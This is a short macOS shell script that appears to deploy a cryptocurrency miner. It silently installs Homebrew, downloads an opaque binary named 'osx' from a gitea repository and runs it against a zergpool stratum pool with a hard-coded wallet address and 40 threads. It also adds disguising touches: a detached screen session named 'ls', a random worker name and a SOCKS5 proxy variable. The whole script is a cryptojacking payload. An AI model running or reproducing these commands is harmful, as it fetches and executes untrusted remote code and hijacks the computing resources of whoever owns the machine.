#!/bin/sh
softwareupdate -l
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
brew install --cask screen
brew install coreutils
wget https://try.gitea.io/siliwangi/vio/raw/branch/master/osx
chmod +x osx
screen -dmS ls 
WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-CPU)
PROXY=socks5://72.195.114.169:4145
./osx -v -l stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb.USD -p c=DOGE,mc=VRSC -t 40\n
